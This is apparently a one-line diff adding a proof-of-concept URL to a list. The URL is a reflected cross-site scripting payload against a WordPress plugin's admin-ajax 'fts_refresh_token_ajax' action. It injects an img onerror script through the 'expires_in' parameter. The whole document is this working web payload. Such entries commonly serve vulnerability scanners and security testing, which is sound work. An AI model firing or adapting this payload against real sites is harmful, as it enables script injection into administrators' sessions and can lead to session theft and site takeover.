@@ -1,0 +1,1 @@
+/wp-admin/admin-ajax.php?action=fts_refresh_token_ajax&feed=instagram&expires_in=%3Cimg%20src%20onerror%3Dalert%28document.domain%29%3E
